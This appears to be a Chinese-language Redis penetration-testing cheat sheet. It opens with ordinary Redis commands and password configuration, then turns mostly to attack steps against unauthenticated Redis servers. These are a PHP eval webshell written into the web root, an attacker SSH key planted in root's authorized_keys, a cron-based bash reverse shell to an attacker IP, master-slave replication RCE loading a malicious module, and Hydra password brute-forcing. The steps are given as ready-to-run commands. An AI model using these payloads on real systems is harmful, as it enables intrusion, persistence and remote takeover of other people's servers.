# Redis

## 常用命令

- 查看信息：info
- 删除所有数据库内容：flushall
- 刷新数据库：flushdb
- 查看所有键：keys *，使用select num可以查看键值数据
- 设置变量：set aaa “mi1k7ea”
- 查看变量值：get aaa
- 查看备份文件路径：config get dir
- 设置备份文件路径：config set dir dirpath
- 查看备份文件名：config get dbfilename
- 设置备份文件名：config set dbfilename filename
- 保存备份文件：save

## 安全配置密码验证

是否设置了密码验证：

```bash
127.0.0.1:6379> config get requirepass
1) "requirepass"
2) ""
```

默认情况下requirepass参数是空的，这就意味着你无需通过密码验证就可以连接到Redis服务。

你可以通过以下命令来修改该参数：

```bash
127.0.0.1:6379> config set requirepass "cmacckk"
OK
127.0.0.1:6379> config get requirepass
1) "requirepass"
2) "cmacckk
```

使用密码验证用到`AUTH`命令

```bash
127.0.0.1:6379> AUTH "cmacckk"
OK
127.0.0.1:6379> AUTH "testpass"
(error) WRONGPASS invalid username-password pair or user is disabled.
```

## 漏洞

### 未授权访问漏洞

即未设置密码，可直接连接

### 向Web目录写入WebShell

具体步骤就是先写入一个含WebShell代码的键值，然后设置备份目录为Web目录，接着设置备份文件名为WebShell文件名，最后通过save命令保存文件到本地。如下：

```bash
set payload "<?php @eval($_POST[c]);?>"
config set dir /var/www/html/
config set dbfilename shell.php
save
```

### 写入SSH公钥后直接登录

加上两个`\n`是为了避免和Redis里其他缓存数据混合

payload的值为攻击机`/home/***/.ssh/id_rsa.pub`的内容

```bash
config set dir /root/.ssh/
config set dbfilename authorized_keys
set payload "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu\n\n"
save
```

或者

```bash
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > m7.txt
cat m7.txt | redis-cli -h 192.168.10.137 -p 6379 set payload
```

最后

```bash
ssh -i id_rsa root@192.168.10.137
```

### 写入定时任务反弹shell

该方法只能CentOS上使用，Ubuntu、Debian上行不通。原因如下：

- 权限问题，Ubuntu定时任务需要root权限；
- Redis备份文件存在乱码，而Debian和Ubuntu对定时任务的格式校验很严格，因此在Debian和Ubuntu上会报错，而在CentOS上不会报错；

原理和前面是一样的，只是备份的目录和文件名修改了下：

```
config set dir /var/spool/cron/crontabs/
config set dbfilename root
set payload "\n\n* * * * * bash -i >& /dev/tcp/192.168.10.307/666 0>&1\n\n"
save
```

不同OS的系统任务调度文件：

```
Ubuntu
/var/spool/cron/crontabs/xxx

Debian
/etc/cron.d/xxx
或
/var/spool/cron/crontabs/xxx

Alpine
/etc/cron.d/xxx
```

> 可进行利用的cron有如下几个地方：
>
> - /etc/crontab 这个是肯定的
> - /etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。
> - /var/spool/cron/root centos系统下root用户的cron文件
> - /var/spool/cron/crontabs/root debian系统下root用户的cron文件

### 主从复制攻击

4.x、5.x 版本的Redis提供了主从模式。在Redis 4.x 之后，通过外部扩展，可以在Redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意so文件，即可执行命令。

Redis主从数据库之间的同步分为两种：

- 全量复制是将数据库备份文件整个传输过去从机，然后从机清空内存数据库，将备份文件加载到数据库中；
- 部分复制只是将写命令发送给从机；

因此，想要复制备份文件的话就需要设置Redis主机的传输方式为全量传输。

这里我们只需要模拟协议收发包就能伪装成Redis主机了，利用工具如下：

```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
git clone https://github.com/Ridter/redis-rce.git
```

第一个工具是用于生成恶意的执行shell的so文件；第二个工具是伪造Redis主机的脚本。

首先要生成恶意so文件，下载第一个工具然后make即可生成。

然后在攻击者机器上执行如下命令即可成功RCE：

```
python redis-rce.py -r 192.168.10.137 -p 6379 -L 192.168.10.141 -f module.so
```

### 用Hydra暴力破解Redis密码

使用Hydra工具可以对Redis密码进行暴力破解：

```
hydra -P /home/fragrant/sec_tools/w3af/w3af/core/controllers/bruteforce/passwords.txt redis://192.168.10.137
```